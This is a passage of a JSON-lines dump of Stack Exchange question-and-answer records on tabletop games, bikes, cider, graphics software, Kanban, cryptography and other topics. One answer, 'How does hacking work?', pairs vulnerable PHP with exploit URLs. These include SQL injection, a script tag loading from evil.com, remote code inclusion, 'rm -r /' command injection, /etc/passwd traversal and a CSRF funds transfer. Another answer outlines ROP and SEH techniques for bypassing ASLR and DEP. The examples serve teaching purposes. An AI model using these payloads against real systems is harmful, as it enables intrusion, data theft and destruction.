ten from each ability score. For example, the black dragon wyrmling (Str 11, Dex 10, Con 13, Int 8, Wis 11, Cha 8) would have modifiers of Con +2, Int -2 and Cha -2.\nLevel adjustment, which increases your effective level for the purposes of how much XP you need to level up.\n\nProgressing your character\nYou can gain character levels as normal. You don't get max HP or 4x skill points for your first character level, as you already got these from your first dragon HD.\nIf your dragon has increased by one of the age increments on Table 3-21: Aging for Dragon PCs, he must take his next level advancing his dragon progression, instead of a character class:\n\nIf he gains a dragon HD, he gains +1 natural armor, plus the normal benefits of a dragon HD (1d12 HP, 6 + Int skill points, +1 base attack, and saving throw progression equivalent to a monk of his level).\nIf he increases his level adjustment, he doesn't get a dragon HD. It's just a blank level to offset the power of playing such a creature.\nIf he increases an age category, he gains the new abilities of that dragon age category in its Monster Manual entry. This includes size, space/reach, speed, natural weapons, special abilities, and increased breath weapon damage and area. He also gains the ability score modifiers of his new size class.\n\n", "question_score": "9", "answer_score": 16}
{"title": "Is there any way to reduce the Essence cost of cyberware?", "description": "Is there any option at character creation I can make to reduce the Essence cost of cyberware besides just buying higher quality (Alpha/Beta..) implants?  I am thinking of specifically a race or quality.\n", "answer": "The splat book you want is Augmentation.\npp. 20-21:\nBiocompatability (10 BP): \nReduce the Essence cost of either cyberware or bioware by 10 percent (choose one type). Does not apply to genetech. This quality may only be taken once.\nType O System (30 BP):\nThe character can't accept second-hand bioware; basic bioware is considered delta grade for purposes of interacting with a type O body (1/2 Essence Cost, but nuyen prices remain the same). (This doesn't affect cyberware, only bioware.)\npp. 48-49:\nCyberware Suites allow you to buy a bunch of cyberware in a bundle, reducing its total Essence Cost. The book has a listing of canned Cyberware Suites; others can be invented, subject to GM approval\np. 88\nCellular Repair is an expensive medical treatment that can restore lost Essence. If the Essence loss is caused by 'ware, the 'ware must first be removed.\np. 90\nAdapsin is a Transgenic gene treatment that reduces the Essence cost of cyberware (not bioware) by 10 percent, if the treatment is applied before the implant. Adapsin is not available at character creation; check with your GM to get approval.\nA few other suggestions:\n\nUse gear whenever you can instead of cyberware. For example, you can cover visual and audio mods using goggles (or contacts) and earbuds. These have their disadvantages, but will save you on Essence Cost.\nCyberlimbs take up a lot of essence, but also allow you to install a lot of gear. Use cybereyes (for example) in lieu of buying individual eye mods.\nMixing and matching cyberware and bioware can reduce the essence loss. The cost of whichever type uses less essence is halved. (SR4A pg 86) For example if you have 3 essence worth of cyberware and 2 essence worth of bioware you only pay 4 essence (3+2/2).\n\n", "question_score": "9", "answer_score": 14}
{"title": "What is the benefit of a larger disc rotor?", "description": "What real benefit does having a larger rotor give to braking performance?\nAdditionally is my assumption correct that you callipers don't actually change in size, just the rotor and the adapter need to be be changed?\nAnd for the bonus point while I'm here, what benefit does moving to a 4 pot system give over a standard (2 piston) calliper?\n", "answer": "Simply put a bigger rotor provided better braking, and a four pot caliper provides better braking - better meaning more, and more control (Everything else being equal). \nFor the same force between the disc and pads, a bigger rotor generates more torque on the wheel - i.e. more stopping force. It is running though the pads faster, generating more friction for the same pressure, more stopping power, and as it has bigger surface area, is dissipating more of the generated heat, meaning the disc and pads run colder. So, for the same caliper and brake pad, a bigger rotor generates more braking for the same pressure or the same amount of braking for less pressure. \nThe disadvantage of a bigger rotor is weight and as its larger, more prone to warping and distortion. \nThis applies to all disc brakes from bicycles to aircraft...... \nFor a bicycle, there comes a time where you have \"enough\", and quickly get to \"too much\" - with high quality equipment its a surprisingly small disk for most people. Big disks a more prone to warping and damage, which is a good reason not install them unless you need to.\nHeat buildup is not normally a problem but low end pads can suffer fad. Small rotors don't typically over heat on bikes (Tandems and loaded tourers might manage it). The main advantage is more breaking for less pressure - so you get more control and feel, and your braking hand tires less (If you have ever done a 1000ft vertical descent in technical tracks on crap brakes you know the feeling) \nA 4 pot caliper provides advantages of more and more even pressure, meaning better braking. Also as there are usually larger pads - more heat dissipation can be achieved.  \nNote: A 29'er would usually need a bigger disc than a 26\" wheel for the same stopping power. \nDon't forget the pad and disk material - these can make a bigger difference than size, but its not as visible. Do not go to big discs and 4 pots unless you are already at the higher end of the quality spectrum.\nEdit: I recently saw some discussion regard discs on road bikes, and some basic physics indicate over heating is a major problem with hydraulic disc brakes and descending large heights (100's of meters vertical) causing the fluid to boil. Extra cooling from a larger rotor would help, but is likely to be just a small part of the answer.  \n", "question_score": "9", "answer_score": 14}
{"title": "What does Counterbalance counter, when revealing a split card?", "description": "Split cards have 2 Converted Mana Costs everywhere except the stack. I saw a similar question relating to Dark Confidant explaining that you lose life for each converted mana cost, however the way it was explained (you get 2 answers) made me unsure if you can counter a spell with either converted mana cost, or the sum of the converted mana costs.\nIf you reveal (for example) Life // Death with Counterbalance, what CMC spells can you counter?\n", "answer": "New answer: While it's not on the stack, Life // Death has a CMC of 3.\nAmonkhet introduced a rules change in 2017 to simplify split cards. When not on the stack, a split card's CMC is the sum of its halves. When on the stack, it has the CMC of whichever side is being cast, or both combined in the case of split cards cast using the Fuse ability (Both halves are treated as one single spell, with the characteristics of each half combined). From the Comprehensive Rules:\n\n708.3 A player chooses which half of a split card they are casting before putting it onto the stack.\n\n708.3b While on the stack, only the characteristics of the half being cast exist. The other half's characteristics are treated as though they didn't exist.\n\n708.4 In every zone except the stack, the characteristics of a split card are those of its two halves combined. This is a change from previous rules.\n\n708.4b The mana cost of a split card is the combined mana costs of its two halves. A split card's colors and converted mana cost are determined from its combined mana cost.\nExample: Assault/Battery's mana cost is {3}{R}{G}. It's a red and green card with a converted mana cost of 5. If you cast Assault, the resulting spell is a red spell with a converted mana cost of 1.\n708.4d The characteristics of a fused split spell on the stack are also those of its two halves combined (see rule 702.101, \"Fuse\").\n\nOld answer:\nIf the spell has converted mana cost 1 or 2, it will be countered.\nThis answer may seem different to the Dark Confidant question. While rule 708.5 adequately answers that question, there are further split card rules relevant to Counterbalance.\n\n708.5 An effect that asks for a particular characteristic of a split card while it’s in a zone other than the stack gets two answers (one for each of the split card’s two halves).\n708.6 Some effects perform comparisons involving characteristics of one or more split cards in a zone other than the stack.\n  \n  \n708.6a An effect that performs a positive comparison (such as asking if a card is red) or a relative comparison (such as asking if a card’s converted mana cost is less than 2) involving characteristics of one or more split cards in any zone other than the stack gets only one answer. This answer is “yes” if either side of each split card in the comparison would return a “yes” answer if compared individually.\n\nWith Dark Confidant and Life // Death, you lose 3 life. This is not because Life // Death has a converted mana cost of 3, but because Dark Confidant receives both answers (1 and 2) and reacts to each of them.\nCounterbalance is a positive comparison: does the revealed card have the same converted mana cost as the cast spell? The converted mana cost of Life // Death is both 1 and 2, so if the revealed card has that a mana cost of either 1 or 2 then the answer to the question is yes, and the spell is countered.\nSo, results that receive more than one answer apply to each of those answers. Positive comparisons that receive more than one answer use the or comparison (one or more \"yes\" = \"yes\"). Negative comparisons (rule 708.6b) use the nor comparison (one or more \"yes\" = \"no).\n", "question_score": "9", "answer_score": 13}
{"title": "Beginners cider homebrewing", "description": "I've never done any homebrewing before but I'd like to start on my own cider. I was wondering what it involves, how long it takes, what sort of equipment I need - just a general introduction.\nThanks\n", "answer": "At a minimum you need:\n\na fermentation vessel (carboy, better\nbottle, bucket, etc.)  \nan airlock \nsanitizer\napple juice with no\npreservatives\nyeast - dry yeast is\ngood, try Nottingham (beer yeast) or\nMontrachet (wine yeast), not bread\nyeast\nbottles and caps\ncapper (unless\nyou have plastic soda bottles)\n5-6\nfeet of 3/8\" food-grade plastic\ntubing\n\nThe basic routine is to sanitize all of your equipment (follow instructions on package), dump the juice in the fermentation vessel, shake it for about a minute to get some oxygen in there, rehydrate the yeast (follow directions on packet), dump the yeast in and seal it up with an airlock.  Wait a few weeks until the liquid clears (is not cloudy).  After that, start a siphon with the tubing (a racking cane is cheap and extremely helpful, but not strictly required) to transfer the cider from the fermentation vessel to the bottles.  The bottles need to be sanitized before using.  Leave the sediment behind while transferring.  Seal or cap bottles.  If you want sparkling cider you can add carbonation drops to the bottles, or dissolve additional sugar in the cider before bottling (3/4 cup is about right).  If you add additional sugar it is helpful to first transfer the cider to a second clean, sanitized vessel so you can leave the sediment behind in the first.  If you made sparkling cider you'll have to keep the bottles in a warm place for 2-3 weeks to let it carbonate.  Still cider will be ready immediately.  Both will improve greatly with age.  \nNOTE: home-made cider is very dry and does not taste like commercial examples.  To some it is an acquired taste.  If you think it lacks apple-y flavor at first, let it age for a month or two.\n", "question_score": "8", "answer_score": 13}
{"title": "Stack Overflows - Defeating Canaries, ASLR, DEP, NX", "description": "To prevent buffer overflows, there are several protections available such as using Canary values, ASLR, DEP, NX. But, where there is a will, there is a way. I am researching on the various methods an attacker could possibly bypass these protection schemes. It looks like there is no one place where clear information is provided.\nThese are some of my thoughts.\nCanary - An attacker could figure out the canary value and use that in his buffer injection to fool the stack guard from detecting an exploit\nDEP, NX - If there are calls to VirtualAlloc(), VirtualProtect(), the attacker could try to redirect code to these functions and disable DEP, NX on the pages that he wants to inject arbitrary code on.\nASLR - No clue . How do ASLR and DEP work?\n", "answer": "Canary\nStack canaries work by modifying every function's prologue and epilogue regions to place and check a value on the stack respectively. As such, if a stack buffer is overwritten during a memory copy operation, the error is noticed before execution returns from the copy function. When this happens, an exception is raised, which is passed back up the exception handler hierarchy until it finally hits the OS's default exception handler. If you can overwrite an existing exception handler structure in the stack, you can make it point to your own code. This is a Structured Exception Handling (SEH) exploit, and it allows you to completely skip the canary check.\nDEP / NX\nDEP and NX essentially mark important structures in memory as non-executable, and force hardware-level exceptions if you try to execute those memory regions. This makes normal stack buffer overflows where you set eip to esp+offset and immediately run your shellcode impossible, because the stack is non-executable. Bypassing DEP and NX requires a cool trick called Return-Oriented Programming.\nROP essentially involves finding existing snippets of code from the program (called gadgets) and jumping to them, such that you produce a desired outcome. Since the code is part of legitimate executable memory, DEP and NX don't matter. These gadgets are chained together via the stack, which contains your exploit payload. Each entry in the stack corresponds to the address of the next ROP gadget. Each gadget is in the form of instr1; instr2; instr3; ... instrN; ret, so that the ret will jump to the next address on the stack after executing the instructions, thus chaining the gadgets together. Often additional values have to be placed on the stack in order to successfully complete a chain, due to instructions that would otherwise get in the way.\nThe trick is to chain these ROPs together in order to call a memory protection function such as VirtualProtect, which is then used to make the stack executable, so your shellcode can run, via an jmp esp or equivalent gadget. Tools like mona.py can be used to generate these ROP gadget chains, or find ROP gadgets in general.\nASLR\nThere are a few ways to bypass ASLR:\n\nDirect RET overwrite - Often processes with ASLR will still load non-ASLR modules, allowing you to just run your shellcode via a jmp esp.\nPartial EIP overwrite - Only overwrite part of EIP, or use a reliable information disclosure in the stack to find what the real EIP should be, then use it to calculate your target. We still need a non-ASLR module for this though.\nNOP spray - Create a big block of NOPs to increase chance of jump landing on legit memory. Difficult, but possible even when all modules are ASLR-enabled. Won't work if DEP is switched on though.\nBruteforce - If you can try an exploit with a vulnerability that doesn't make the program crash, you can bruteforce 256 different target addresses until it works.\n\nRecommended reading:\n\nCorelan - Chaining DEP with ROP\nCorelan - Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR\nASLR/DEP bypass whitepaper (PDF)\n\n", "question_score": "98", "answer_score": 107}
{"title": "How does hacking work?", "description": "I am specifically talking about web servers, running Unix. I have always been curious of how hackers get the entry point. I mean I don't see how a hacker can hack into the webpage when the only entry method they have into the server is a URL. I must be missing something, because I see no way how the hacker can get access to the server just by changing the URL.\nBy entry point I mean the point of access. The way a hacker gets into the server.\nCould I get an example of how a hacker would make an entry point into a webserver? Any C language is acceptable. I have absolutely no experience in hacking\nA simple example would be appreciated.\n", "answer": "Hacks that work just by changing the URL\n\nOne legit and one malicious example\nSome examples require URL encoding to work (usually done automatically by browser)\n\nSQL Injection\ncode:\n$username = $_POST['username'];\n$pw = $_GET['password'];\nmysql_query(\"SELECT * FROM userTable WHERE username = $username AND password = $pw\");\n\nexploit (logs in as administrator without knowing password):\nexample.com/?username=Administrator&password=legalPasswordThatShouldBePostInsteadOfGet\nexample.com/?username=Administrator&password=password' or 1=1--\n\nCross Site Scripting (XSS)\ncode:\n$nickname= $_GET['nickname'];\necho \"<div>Your nickname is $nickname</div>\\n\";\n\nexploit (registrers visiting user as a zombie in BeEF):\nexample.com/?nickname=Karrax\nexample.com/?nickname=<script src=\"evil.com/beefmagic.js.php\" />\n\nRemote code execution\ncode (Tylerl's example):\n<? include($_GET[\"module\"].\".php\"); ?>\n\nexploit (downloads and runs arbitrary code) :\nexample.com/?module=frontpage\nexample.com/?module=pastebin.com/mymaliciousscript\n\nCommand injection\ncode:\n<?php\necho shell_exec('cat '.$_GET['filename']);\n?>\n\nexploit (tries to delete all files from root directory):\nexample.com/?filename=readme.txt\nexample.com/?filename=readme.txt;rm -r /\n\nCode injection\ncode:\n<?php\n$myvar = \"varname\";\n$x = $_GET['arg'];\neval(\"\\$myvar = \\$x;\");\n?>\n\nexploit (injects phpinfo() command which prints very usefull attack info on screen):\nexample.com/?arg=1\nexample.com/?arg=1; phpinfo() \n\nLDAP injection\ncode:\n<?php\n$username = $_GET['username'];\n$password = $_GET['password'];\nldap_query(\"(&(cn=$username)(password=$password)\")\n?>\n\nexploit (logs in without knowing admin password):\nexample.com/?username=admin&password=adminadmin\nexample.com/?username=admin&password=*\n\nPath traversal\ncode:\n<?php\ninclude(\"./\" . $_GET['page']);\n?>\n\nexploit (fetches /etc/passwd):\nexample.com/?page=front.php\nexample.com/?page=../../../../../../../../etc/passwd\n\nRedirect/Forward attack\ncode:\n <?php\n $redirectUrl = $_GET['url'];\n header(\"Location: $redirectUrl\");\n ?>\n\nexploit (Sends user from your page to evil page) :\nexample.com/?url=example.com/faq.php\nexample.com/?url=evil.com/sploitCode.php\n\nFailure to Restrict URL Access\ncode:\nN/A. Lacking .htaccess ACL or similar access control. Allows user to guess or by other \nmeans discover the location of content that should only be accessible while logged in.\n\nexploit:\nexample.com/users/showUser.php\nexample.com/admins/editUser.php\n\nCross-Site Request Forgery\ncode:\nN/A. Code lacks page to page secret to validate that request comes from current site.\nImplement a secret that is transmitted and validated between pages. \n\nexploit:\nLegal: example.com/app/transferFunds?amount=1500&destinationAccount=4673243243\nOn evil page: <img src=\"http://example.com/app/transferFunds?amount=1500\ndestinationAccount=evilAccount#\" width=\"0\" height=\"0\" />\n\nBuffer overflow (technically by accessing an URL, but implemented with metasploit\ncode:\nN/A. Vulnerability in the webserver code itself. Standard buffer overflow\n\nExploit (Metasploit + meterpreter?):\nhttp://www.exploit-db.com/exploits/16798/\n\n", "question_score": "97", "answer_score": 189}
{"title": "Is it a security risk to maintain an application developed for a version of .NET prior to 4.0?", "description": "I've had a request that we upgrade all our internally developed applications to .NET v4.0.\nNeedless to say, this is a massive chunk of work. Is using applications based on the .NET framework prior to v4.0 a genuine security issue?\n", "answer": "No it's not a risk to run an earlier framework (except for 1.x), just make sure it's patched as described below.\nAll frameworks will get free security updates as described in Mainstream and Extended Support phase.  Each framework needs to have it's own service pack.  (scroll to bottom of that link)\nTo make things easier, .NET 3.5 SP1 is considered a core component of the Windows OS.  The standard Windows support guidance applies.  In particular: \n\n.NET 1.0 is a security risk since no hotfixes have been produced since SP3 past July 14 2009\n.NET 1.1 should be at SP1, though security hotfix support ends October 2013 unless you are running it on Server 2003 (security hotfix support for Server 2003 ends July 2015).\n.NET 2.0 should be at SP2\n.NET 3.0 should be at SP2\n.NET 3.5 should be at SP1\n.NET 4.0 will reach end of support on all OS on January 12, 2016\n.NET 4.5 should be at 4.5.2.  Support expiration is based on the OS and the most recent service pack for that OS.  (e.g. Windows 7 SP1)\n\nWhat is the Security Update policy?\nSecurity updates will be available through the end of the Extended\n  Support phase (five years of Mainstream Support plus five years of the\n  Extended Support) at no additional cost for most products. Security\n  updates will be posted on the Microsoft Update Web site during both\n  the Mainstream and the Extended Support phase.\nIs the Extended Hotfix Support program required for customers to receive security updates?\nNo. Any customer can report a security issue to Microsoft. Microsoft\n  will review the issue. If a security update is created, it will be\n  made available to customers as described earlier in this document.\n\n", "question_score": "9", "answer_score": 10}
{"title": "Decryption on AES when the same key and IV are used", "description": "Let's say that I have three messages being encrypted by AES-128 with the same key and IV every time. Is it possible to decrypt the key being used? And more importantly, is it possible to decrypt the plaint text of those messages?\n", "answer": "What happens here depends on the mode of operation. As a basic rule, knowledge of the messages will not allow you to recompute the key itself, but it may give you enough information to (instantly) crack any other message encrypted with the same key and IV.\nWith CTR mode, a key-dependent stream is produced by encrypting the successive values of a counter, and the counter starts at the value given in the IV. The actual data encryption is performed by XORing this stream with the data to encrypt. If the same key and IV are used, then you get the same stream, so you have the conditions of the (in)famous two-times pad. Without knowing the key, you can still compute the XOR of any two messages, which is often enough to crack them, by exploiting their internal structure. Once one of the messages is known, this reveals the key-dependent stream (up to the message length) and this allows for immediate decryption of any other message (up to that length) encrypted with the same key+IV.\nOFB mode is in a similar situation: It produces a key-dependent pseudo-random stream. So it can be broken with the same level of ease as CTR.\nWith CBC mode, things are a bit harder for the attacker. If the messages start with the same bytes, then you will be able to see it. After the first distinct bytes, decryption becomes much harder. This is because, in effect, each block in CBC encryption is used as an IV for the remainder of the message, and encryption of data with a block cipher tends to produce properly distributed IVs for CBC. Generically, CBC requires a uniformly random IV which is unpredictable by the attacker, but in your situation you envision a passive-only attacker, and against such an adversary, an IV selected by encrypting a known data block is good enough for CBC, as long as the IV source is not reused; this is what you obtain with your messages, beginning with the first block at which the messages differ.\nCFB mode is somewhere in between. If two messages begin with the same n bytes, then the encrypted messages will begin with the same n bytes too; then, for the remainder of the block containing the n+1-th byte, this is two-times pad. For the subsequent bytes, the streams have forked and the attacker's power stops.\nImportant: though the paragraphs above seem to indicate that CBC or CFB would be safe for key+IV reuse as long as you include a counter in the header of each message, remember that this is for a passive attacker only. In many (most) scenarios, the attacker can be also embed a bit of data of his own in the messages which are to be encrypted, and/or alter the encrypted bytes and see what happens when they are decrypted. For these scenarios, which are realistic (many recent attacks against SSL are all about that), IV reuse, and even predictable IV selection (with CBC), are hopelessly weak. Do not reuse IVs.\nThe only situation where a fixed IV is fine is when keys are never reused, i.e. each key is used for a single message only. This is, in practice, harder to obtain than a new per-message IV, because keys must be kept confidential: It is already challenging to have a key which is known by both the sender and the receiver, but by nobody else. At least, IVs do not have this confidentiality requirement, and thus can be transmitted along with the message itself.\n", "question_score": "9", "answer_score": 13}
{"title": "How to describe a kiss between the protagonists in third person?", "description": "I'm writing in third person because I want to express the standpoint of both of my characters. Everything's running smoothly except for the part where I want to describe their kiss. I'm in conflict with the idea that in whose POV should I describe the emotion they have during the kiss.\nThese are the possible options I have and also that the problem that I face with those:\nOption 1: I should stick to describing only one person's emotion.\nProblem: I want to describe both of their emotions. Period. \nOption 2: I should write both of their feelings. \nProblem: How do I do that? \n\nSimutaneously describing? I feel like I'm flitting from 'he' to 'she', 'him' to 'her'. I feel disconnected and so will the reader. \nOne passage each? First 'her' feeling and then 'his' feeling? It reads way too long than the time taken to actually kiss. Also it might seem to look like it's being repeated. Shortening it would make it way too small for each.  \n\nSo can you help me in solving my conflict and problems? Can you help me suggest a better way of carrying this out?\n", "answer": "I suspect that you don't really want to describe their emotions in the clinical sense. Rather, you want the reader to know how they feel, and to feel how they feel, or at least to feel sympathy for how they feel, at the moment of the kiss. \nIf so, the way you do that is not through what you say in the moment of the kiss. It is how you set it up. Think about how a great romantic kiss is handled in a movie. It does not come out of the blue. It is meticulously set up as the characters go from bickering to flirting to longing so that long before the kiss comes the audience is aching for it, is shouting \"shut up and kiss her you fool\" at the screen as the hero bumbles through his courtship. Once all that setup work is done, there is no need to describe anybody's emotions. The audience knows exactly what the emotions are, and they feel those emotions too. This kiss is just the trigger, the moment of release, the moment of fulfillment for all the work that has gone before. \nAs a writer, therefore, you never describe important emotions. You create them. You only describe an emotion if it is secondary, if it is not something that you expect the reader to participate in or empathize with -- some piece of business that is necessary to drive the plot but is not of the essence of the story arc. \nSo many of the POV question here really come down to the same thing. A struggle to describe in the moment emotions that should have been set up by careful preparation. They are not really POV problems at all. They are setup problems. Create emotions, don't describe them. \n", "question_score": "9", "answer_score": 19}
{"title": "What is the difference between an amateur and a professional camcorder?", "description": "It is known that professional photographers use SLRs & regular users use point & shoot camera. What kind of cameras do professional videographers use & whats the difference?\n", "answer": "I'd regard this as off topic as it concerns video cameras not stills, but anyway a lot of professionals use the Red series of cameras:\nhttp://www.red.com/\nThe most popular being the Red One:\n\n(source: redoneutah.com)\nBenefits over consumer level video cameras nicely mirrors the difference between DSLRs and Compacts, namely:\n\nThe ability to shoot video in raw, for example using the proprietary RecCode format. This makes contrast adjustments, post production and grading easier.\n\nA larger sensor, the Red One has a similar sized sensor to a DSLR (same size as super 35 film) this allows better low light performance and shallower depth of field.\n\nThe ability to have interchangable lenses.\n\nHigher resolution pictures (again to refer to the Red One it will output at 4k (4,096 x 2,304 pixels, which is at least four times full HD)).\n\nBetter build quality. All professional tools should be built to be packed up and shipped round the world and work first time on location.\n\nThere are other advantages specific to professional videography cameras, namely:\n\nHigher framerates for [real] slow motion 24fps -> 1000fps (some consumer cameras do this, but not very well)\n\nWider range of inputs for mics etc.\n\nWider range of accessories, HD out for live monitoring etc.\n\nRecord to multiple data banks, HDDs, flash memory etc.\n\nAnother difference is that professionals will more often than not hire equipment as the cameras cost more than even the most expensive 35mm DSLRs, and they are typically only shooting for part of the year in intensive bursts. This also enables the use of specialist cameras (such as the Phantom 1000fps camera, which can only be rented, not bought).\nIt's worth pointing out that DSLRs which shoot video offer many of the advantages posted above, but they lack the modularity and flexibility of output that you get with a professional digital cine camera. They are also limited in terms of shooting time.\n", "question_score": "9", "answer_score": 10}
{"title": "How to select more layers with GIMP?", "description": "In Adobe Photoshop I am able to select multiple layers at once with Shift+Click.\nHow can I do that in GIMP?\n", "answer": "It's not possible. The only thing you can do is link layers together or merge them. How to link layers information here.\n\nInstead, there are several alternative methods of handling multiple layers, each appropriate to a different task. You can chain layers to move or transform them, shift-click objects on different layers in the canvas to align them, or create a new layer based on all visible layers.\nInstructions:\n\nChaining Layers:\n1) Make sure the Layers dialog box is open. If it is not, click on the Windows menu and select \"Dockable Dialogs\" > \"Layers.\" You can\n  also hold down the \"Ctrl\" key and press \"L.\"\n2) Hover your mouse between the Layer Visibility icon, which looks like an eye, and the layer thumbnail. A raised box will appear.\n  Click this box to activate the chain.\n3) Repeat this process on all of the other layers you wish to chain together. Once these layers are chained, you can move or apply\n  transformation effects to all of them simultaneously.\nSelecting for Alignment\n4) Make sure the Toolbox is open. If it is not, click on the Windows menu and select \"Toolbox.\" You can also hold down the \"Ctrl\"\n  key and press \"B.\"\n5) Click on the Alignment Tool in the Toolbox. It looks like an empty rectangle with arrows pointing away from all sides of it.\n6) Press and hold the \"Shift\" key while clicking on the layers in the canvas. Or click somewhere off the layers and drag a selection\n  rectangle around them. Once you have selected these layers, you can\n  choose an alignment method.\nMerging Visible Layers\n7) Make sure the Layers dialog box is open. If it is not, click on the Windows menu and select \"Dockable Dialogs\" > \"Layers.\" You can\n  also hold down the \"Ctrl\" key and press \"L.\"\n8) Click on the Visibility icon on any layer you do not want to include in your new layer. This will render that layer invisible.\n9) Click on the Layers menu and select \"New from Visible.\"\n10) Select the option that best describes how you want the layers to be merged from the dialog box that appears, and click \"Merge.\" This\n  will merge all of the visible layers into a new layer but will not\n  affect your original layers.\n\nSource here.\n", "question_score": "94", "answer_score": 74}
{"title": "How do I create a tri-colored arc in Inkscape?", "description": "I need to cut an arc which has three colors say red, green and blue one after the other. This is for a circular game paddle.\nI am using a differentiate on a square and a circle, then rotating the entire thing and deleting the longer arc-path and changing the color of the smaller-arc.\nIs there a simpler and more efficient method to create a tri-color arc?\nHere is a glimpse of my effort:\n\nNow I need to make each section of the arc uniform. I want easy ways to use angle or specify size percent.\nI found these formulas:\nhttp://www.regentsprep.org/regents/math/geometry/gp15/circlearcs.htm\n", "answer": "\nStart by drawing a circle using the Circle tool, whilst holding down Ctrl\nTurn on \"Snap to object centre\" & \"Snap to rotation centre\" and create guides that snap to the centre of the circle\n\nWith the circle tool and circle still selected, you can calculate the arc length you desire by expressing it as a percentage fraction X 360. i.e. (25/100)*360 can be typed directly into the \"End\" box to give you 25% arc length which is 90 degrees. Note: the brackets are important.\nMake sure you click \"Switch to arc\" after you calculate the arc size.\nWith the Selection tool, click the rotation point and move it to the guide intersection. We want to rotate and duplicate the arc around this point.\n\nClone the arc with Alt+D, and click the arc layer again to make the rotation handles appear. Use the selection tool to rotate the arc around the pivot point, and press SPACEBAR to clone/stamp the arc around this point.\n\nSelect all clones and Shift+Alt+D to unlink clones. You can now remove any fills and enter the arc stroke colours as you wish.\n\nFor different arc lengths: After you Unlink your arc clones, you can enter different values into the \"End\" box (whilst the circle tool is selected) for each arc. Make sure you move the centrepoints of the arcs into the intersecting guides & rotate each arc to join them together.\n\n", "question_score": "9", "answer_score": 17}
{"title": "What is lead time?", "description": "I am struggling to truly grasp what lead time means on a Kanban project. \nI have read about it in several books but I still can't get my head around it. \nCan someone explain it. \n", "answer": "Wiki has the common definition of this term:\n\nA lead time is the latency between the initiation and execution of a\n  process.\n\nIf your working area is software development, then the definition from JIRA golossary may be more understandable for you:\n\nLead time is the time taken from when an issue is logged until work is\n  completed on that issue.\n\nIn other words (example for software area): A lead time is the time between a moment when you have registered an issue and the moment when you have delivered the new version of the software with the issue resolved (new version is deployed/new patch is released/etc):\n  Issue                                                          Issue \nrequested =================================================>>> delivered\n\n   |                    Activity                       Activity    |\n   |---------------|---------------|---------------|---------------|---------------|\n   |    List of         List of          List of        List of    |   List of     \n   |    created         issues         implemented     delivering  |  delivered    \n   |    issues           under           issues         issues     |   issues      \n   |                 implementation                                |               \n   |                                                               |               \n   |                                                               |               \n   |                                                               |               \n   |<--------------------------Lead Time-------------------------->|\n\nDo not confuse this term with the similar \"Cycle Time\" term:\n\nLead time clock starts when the request is made and ends at delivery.\n  Cycle time clock starts when work begins on the request and ends when\n  the item is ready for delivery.  Cycle time is a more mechanical measure of process capability. Lead time is what the customer sees.\n\n  Issue                                                          Issue \nrequested ================================================>>>> delivered\n\n   |                    Activity                       Activity    |\n   |---------------|---------------|---------------|---------------|---------------|\n   |    List of    |    List of    |     List of        List of    |    List of    \n   |    created    |    issues     |   implemented     delivering  |   delivered   \n   |    issues     |     under     |     issues         issues     |    issues     \n   |               | implementation|                               |               \n   |               |               |                               |               \n   |               |<-Cicle  time->|                               |\n   |                                                               |\n   |<--------------------------Lead Time-------------------------->|\n\nAlso, take a look to this article: Kanban: Definition of Lead Time and Cycle Time. It's about the same concerns, but with nice pictures.\nAnd yet another article with same content (in case if you don't like JIRA's swimlanes and ASCII graphics): Cycle Time [and Lead Time].\n\nIf you still have a problem with understanding the term \"Lead Time\", please leave a comment, I will try to clarify it.\n", "question_score": "9", "answer_score": 12}
{"title": "Do red-headed people feel pain differently?", "description": "There is a long-standing belief among anaesthsetists that people with red hair need more anaesthetic. There even appears to be some evidence. to back up this widely held idea.\nRecently, though, a different study (reported by Gizmodo here) has suggested the opposite: that redheads are less sensitive to some types of pain. As they report\n\nIt turns out that gingers are less sensitive to stinging pain in the skin, according to researchers who injected capsicum, the active ingredient in chilies, into the arms of patients. \n\nIt may be that the experiments looked at different types of pain but both seemed to conclude that redheads are different. So, are they? Are the studies reliable enough to come to trustworthy conclusions? Are there other studies that support the findings?\n", "answer": "Answer\nThis scientific article states that a mutation in the MC1R (which is what causes red hair) can also cause some sort of pain reduction, as well as a lesser sensitivity to anaesthetics.\n\nResults: C57BL/6-Mc1re/e mutant mice and human redheads—both with non-functional MC1Rs—display reduced sensitivity to noxious stimuli and increased analgesic responsiveness to the µ-opioid selective morphine metabolite, M6G. In both species the differential analgesia is likely due to pharmacodynamic factors, as plasma levels of M6G are similar across genotype.\n\nHowever, this report adds that redheads were more sensitive to thermal pain, while less responsive to the common anaesthetic lidocaine.\n\nResults: Current perception, pain perception, and pain tolerance thresholds were similar in the red-haired and dark-haired women at 2000, 250, and 5 Hz. In contrast, redheads were more sensitive to cold pain perception (22.6°C [15.1, 26.1] vs. 12.6°C [0, 20], P=0.004), cold pain tolerance (6.0°C [0, 9.7] vs. 0.0°C [0.0, 2.0], P=0.001), and heat pain (46.3°C [45.7, 47.5] vs. 47.7°C [46.6, 48.7], P=0.009). Subcutaneous, lidocaine was significantly less effective in redheads, e.g., pain tolerance threshold at 2000 Hz stimulation in redheads was 11.0 mA [8.5, 16.5] vs. >20.0 mA [14.5, >20] in others, P=0.005)\n\nAdditionally, this article states that redheads are significantly less sensitive to the anaesthetic desflurane.\n\nThe desflurane requirement in redheads (6.2 volume-percent [95% CI, 5.9 - 6.5]) was significantly greater than in dark-haired women (5.2 volume-percent [4.9 – 5.5], P = 0.0004). Nine of 10 redheads were either homozygous or compound heterozygotes for mutations on the melanocortin-1 receptor gene.\n\nLastly, this Wikipedia article explains...\n\nThese observations suggests a role for mammalian MC1R outside the pigment cell, though the exact mechanism through which the protein can modulate pain sensation is not known.\n\nIn summary: Redheads do appear to be less responsive to general anaesthetics, as far as reported. However, either an increase and/or decrease to different types of painful stimuli is shown. Also, the mechanism for these results is still unknown, but is very probably related to the mutation in the MC1R which gives redheads their red hair in the first place.\nNote: All added emphasis is my own.\n\nReferences\n\nMogil, J, J Ritchie, S Smith, K Strasburg, L Kaplan, M Wallace, R Romberg, et al. “Melanocortin-1 Receptor Gene Variants Affect Pain and Μ-opioid Analgesia in Mice and Humans.” Journal of Medical Genetics 42, no. 7 (July 2005): 583–587.\nLiem, Edwin B., Teresa V. Joiner, Kentaro Tsueda, and Daniel I. Sessler. “Increased Sensitivity to Thermal Pain and Reduced Subcutaneous Lidocaine Efficacy in Redheads.” Anesthesiology 102, no. 3 (March 2005): 509–514.\nLiem, Edwin B., Chun–Ming Lin, Mohammad–Irfan Suleman, Anthony G. Doufas, Ronald G. Gregg, Jacqueline M. Veauthier, Gary 